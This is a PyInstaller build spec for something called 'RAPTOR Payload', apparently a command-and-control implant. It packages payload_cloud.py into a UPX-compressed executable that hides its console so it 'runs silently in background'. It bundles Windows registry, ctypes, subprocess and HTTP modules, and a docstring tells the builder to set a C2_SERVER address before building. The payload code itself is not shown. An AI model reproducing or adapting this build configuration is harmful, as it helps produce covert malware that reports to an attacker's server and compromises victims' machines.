# -*- mode: python ; coding: utf-8 -*-
"""
PyInstaller spec file for RAPTOR Payload
This provides fine-grained control over the EXE build process

IMPORTANT: Update C2_SERVER in payload_cloud.py before building!
"""

block_cipher = None

a = Analysis(
    ['payload_cloud.py'],  # Root directory path
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'psutil',
        'psutil._psutil_linux',
        'psutil._psutil_windows',
        'psutil._psutil_osx',
        'socket',
        'platform',
        'subprocess',
        'json',
        'requests',
        'urllib3',
        'certifi',
        'charset_normalizer',
        'idna',
        'http',
        'http.client',
        'email',
        'encodings',
        'ctypes',
        'ctypes.wintypes',
        'winreg',  # Windows registry access
        'pywintypes',  # Windows-specific
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'numpy',
        'pandas',
        'scipy',
        'PIL',
        'tkinter',
        'IPython',
        'notebook',
        'jupyter',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(
    a.pure,
    a.zipped_data,
    cipher=block_cipher
)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='raptor_payload',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,  # Compress the executable with UPX
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Hide console window - runs silently in background
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,  # Add icon='path/to/icon.ico' if you have one
)
